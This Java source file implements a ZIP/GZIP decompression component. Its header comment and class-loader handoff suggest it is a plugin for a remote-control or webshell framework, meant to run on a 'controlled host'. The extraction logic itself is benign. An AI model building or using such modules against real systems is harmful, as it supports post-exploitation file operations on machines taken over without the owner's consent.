package org.leo.core.component;

import java.io.*;
import java.util.HashMap;
import java.util.zip.GZIPInputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

/**
 * 文件解压组件
 * 提供跨平台的ZIP和GZIP文件解压功能
 * 设计为在被控主机上稳定执行，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.2
 */
public class DecompressComponent implements Runnable {
    
    
    // 缓冲区大小
    private static final int BUFFER_SIZE = 8192;

    
    private HashMap params;
    private HashMap results;


    @Override

    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    /**
     * 解压ZIP文件
     */
    public void decompress(String zipFile, String outputFolder) throws IOException {
        File zipFileObj = new File(zipFile);
        
        // 验证ZIP文件是否存在
        if (!zipFileObj.exists()) {
            throw new IOException("ZIP文件不存在: " + zipFile);
        }
        
        if (!zipFileObj.isFile()) {
            throw new IOException("指定路径不是文件: " + zipFile);
        }
        
        // 创建输出目录
        File outDir = new File(outputFolder);
        if (!outDir.exists()) {
            if (!outDir.mkdirs()) {
                throw new IOException("无法创建输出目录: " + outputFolder);
            }
        }
        
        int fileCount = 0;
        long totalSize = 0;
        
        ZipInputStream zis = null;
        try {
            zis = new ZipInputStream(new FileInputStream(zipFile));
            ZipEntry zipEntry;
            while ((zipEntry = zis.getNextEntry()) != null) {
                File newFile = new File(outputFolder, zipEntry.getName());
                
                // 安全检查：防止路径遍历攻击
                if (!newFile.getCanonicalPath().startsWith(outDir.getCanonicalPath())) {
                    throw new IOException("检测到不安全的文件路径: " + zipEntry.getName());
                }
                
                if (zipEntry.isDirectory()) {
                    if (!newFile.mkdirs()) {
                        throw new IOException("无法创建目录: " + newFile.getAbsolutePath());
                    }
                } else {
                    // 确保父目录存在
                    File parent = newFile.getParentFile();
                    if (parent != null && !parent.exists()) {
                        if (!parent.mkdirs()) {
                            throw new IOException("无法创建父目录: " + parent.getAbsolutePath());
                        }
                    }
                    
                    long fileSize = writeFile(zis, newFile);
                    totalSize += fileSize;
                    fileCount++;
                }
                zis.closeEntry();
            }
        } finally {
            closeStream(zis);
        }
        
        results.put("code", 200);
        results.put("msg", "ZIP解压完成: " + zipFile + " -> " + outputFolder);
        results.put("zipFile", zipFile);
        results.put("outputFolder", outputFolder);
        results.put("fileCount", fileCount);
        results.put("totalSize", totalSize);
        results.put("format", "zip");
    }

    /**
     * GZIP解压文件
     */
    public void gzipDecompress(String gzipFile, String outputFile) throws IOException {
        File gzipFileObj = new File(gzipFile);
        
        // 验证GZIP文件是否存在
        if (!gzipFileObj.exists()) {
            throw new IOException("GZIP文件不存在: " + gzipFile);
        }
        
        if (!gzipFileObj.isFile()) {
            throw new IOException("指定路径不是文件: " + gzipFile);
        }
        
        // 创建输出目录
        File outputFileObj = new File(outputFile);
        File parentDir = outputFileObj.getParentFile();
        if (parentDir != null && !parentDir.exists()) {
            if (!parentDir.mkdirs()) {
                throw new IOException("无法创建输出目录: " + parentDir.getAbsolutePath());
            }
        }
        
        GZIPInputStream gzis = null;
        FileOutputStream fos = null;
        long totalSize = 0;
        
        try {
            gzis = new GZIPInputStream(new FileInputStream(gzipFile));
            fos = new FileOutputStream(outputFile);
            
            byte[] buffer = new byte[BUFFER_SIZE];
            int length;
            while ((length = gzis.read(buffer)) > 0) {
                fos.write(buffer, 0, length);
                totalSize += length;
            }
        } finally {
            closeStream(gzis);
            closeStream(fos);
        }
        
        results.put("code", 200);
        results.put("msg", "GZIP解压完成: " + gzipFile + " -> " + outputFile);
        results.put("gzipFile", gzipFile);
        results.put("outputFile", outputFile);
        results.put("totalSize", totalSize);
        results.put("format", "gzip");
    }

    /**
     * 写入解压的文件（ZIP格式）
     */
    private long writeFile(ZipInputStream zis, File newFile) throws IOException {
        long fileSize = 0;
        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(newFile);
            byte[] buffer = new byte[BUFFER_SIZE];
            int length;
            while ((length = zis.read(buffer)) > 0) {
                fos.write(buffer, 0, length);
                fileSize += length;
            }
        } finally {
            closeStream(fos);
        }
        return fileSize;
    }

    /**
     * 关闭流资源
     */
    private void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (IOException e) {
                // 忽略关闭时的异常
            }
        }
    }

    /**
     * 主执行方法
     */
    public void invoke() throws Exception {
        // 参数验证
        Object srcObj = params.get("src");
        Object desObj = params.get("des");
        String format = (String) params.get("format");
        String src = new String((byte[]) srcObj, "utf-8");
        String des = new String((byte[]) desObj, "utf-8");
        // 设置默认格式为ZIP
        if (format == null || format.trim().equals("")) {
            format = "zip";
        }
        
        try {
            if ("zip".equalsIgnoreCase(format)) {
                decompress(src, des);
            } else if ("gzip".equalsIgnoreCase(format)) {
                gzipDecompress(src, des);
            } else {
                throw new IllegalArgumentException("不支持的解压格式: " + format + " (支持: zip, gzip)");
            }
        } catch (Exception e) {
            results.put("code", 500);
            results.put("msg", e.getMessage());
        }
    }
}
